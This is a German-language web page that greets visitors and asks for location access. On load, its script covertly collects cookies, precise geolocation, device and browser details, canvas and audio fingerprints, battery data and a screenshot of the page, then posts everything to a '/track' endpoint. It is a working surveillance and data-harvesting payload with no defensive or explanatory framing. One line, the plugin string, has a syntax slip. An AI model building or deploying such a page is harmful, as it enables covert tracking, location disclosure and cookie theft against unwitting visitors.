<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Willkommen</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; padding: 24px; text-align: center; }
    .ok { color: green; }
    .err { color: #b00; }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
  <h1>Willkommen</h1>
  <p>Bitte erlaube den Zugriff auf deinen Standort, um fortzufahren.</p>
  <div id="status">Sammle Daten…</div>

  <script>
    async function getGeoPermission() {
      try {
        if (!navigator.permissions) return 'unbekannt';
        const s = await navigator.permissions.query({ name: 'geolocation' });
        return s.state; // 'granted' | 'denied' | 'prompt'
      } catch { return 'unbekannt'; }
    }

    async function getBattery() {
      if (!navigator.getBattery) return '–';
      try {
        const battery = await navigator.getBattery();
        return JSON.stringify({
          charging: battery.charging,
          level: battery.level * 100 + '%',
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        });
      } catch { return '–'; }
    }

    function getPlugins() {
      if (!navigator.plugins) return '–';
      return Array.from(navigator.plugins).map(p => ${p.name} (${p.version || '–'})).join(', ');
    }

    function getFonts() {
      const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
      return fonts.filter(font => {
        const span = document.createElement('span');
        span.style.fontFamily = font;
        span.innerHTML = 'abcdefghijklmnopqrstuvwxyz';
        document.body.appendChild(span);
        const width = span.offsetWidth;
        document.body.removeChild(span);
        return width !== 0;
      }).join(', ');
    }

    function getWebGL() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return '–';
        const info = gl.getExtension('WEBGL_debug_renderer_info');
        return JSON.stringify({
          vendor: info?.glGetParameter(info.UNMASKED_VENDOR_WEBGL) || '–',
          renderer: info?.glGetParameter(info.UNMASKED_RENDERER_WEBGL) || '–'
        });
      } catch { return '–'; }
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Hello, world!', 2, 15);
        ctx.strokeStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.beginPath();
        ctx.arc(100, 75, 50, 0, Math.PI * 2, true);
        ctx.stroke();
        return canvas.toDataURL();
      } catch { return '–'; }
    }

    async function getAudioFingerprint() {
      try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = ctx.createOscillator();
        oscillator.type = 'sine';
        oscillator.frequency.setValueAtTime(440, ctx.currentTime);
        const compressor = ctx.createDynamicsCompressor();
        oscillator.connect(compressor);
        compressor.connect(ctx.destination);
        oscillator.start();
        oscillator.stop(ctx.currentTime + 0.1);
        await new Promise(resolve => setTimeout(resolve, 100));
        return JSON.stringify({ sampleRate: ctx.sampleRate, state: ctx.state });
      } catch { return '–'; }
    }

    async function getScreenshot() {
      try {
        const canvas = await html2canvas(document.body);
        return canvas.toDataURL('image/png');
      } catch { return null; }
    }

    async function collectData(geoStatus) {
      return {
        request_id: crypto?.randomUUID() || String(Date.now()),
        lat: null,
        lon: null,
        accuracy: null,
        altitude: null,
        heading: null,
        speed: null,
        geo_status: geoStatus || 'unbekannt',
        userAgent: navigator.userAgent || '',
        language: navigator.language || '',
        languages: JSON.stringify(navigator.languages || []),
        cookies: document.cookie || '',
        screen: JSON.stringify({
          width: window.screen?.width,
          height: window.screen?.height,
          colorDepth: window.screen?.colorDepth,
          availWidth: window.screen?.availWidth,
          availHeight: window.screen?.availHeight
        }),
        window: JSON.stringify({
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight
        }),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        platform: navigator.platform || '',
        hardwareConcurrency: navigator.hardwareConcurrency ?? '',
        deviceMemory: navigator.deviceMemory ?? '',
        connection: JSON.stringify(navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        } : {}),
        referrer: document.referrer || '',
        plugins: getPlugins(),
        fonts: getFonts(),
        webgl: getWebGL(),
        battery: await getBattery(),
        canvas_fingerprint: getCanvasFingerprint(),
        audio_fingerprint: await getAudioFingerprint(),
        screenshot: await getScreenshot(),
        timestamp: new Date().toISOString()
      };
    }

    async function sendData(data) {
      return fetch('/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    (async function run() {
      const geoStatus = await getGeoPermission();
      const data = await collectData(geoStatus);

      const done = () => {
        const s = document.getElementById('status');
        s.textContent = '✅ Daten wurden an den Server gesendet.';
        s.className = 'ok';
      };
      const fail = (err) => {
        console.error(err);
        const s = document.getElementById('status');
        s.textContent = '❌ Senden fehlgeschlagen.';
        s.className = 'err';
      };

      // Präzise Geolocation (High Accuracy)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            data.accuracy = typeof pos.coords.accuracy === 'number' ? pos.coords.accuracy : null;
            data.altitude = typeof pos.coords.altitude === 'number' ? pos.coords.altitude : null;
            data.heading = typeof pos.coords.heading === 'number' ? pos.coords.heading : null;
            data.speed = typeof pos.coords.speed === 'number' ? pos.coords.speed : null;
            sendData(data).then(done).catch(fail);
          },
          () => { // Verweigert/Fehler -> ohne Location senden
            sendData(data).then(done).catch(fail);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        sendData(data).then(done).catch(fail);
      }
    })();
  </script>
</body>
</html>
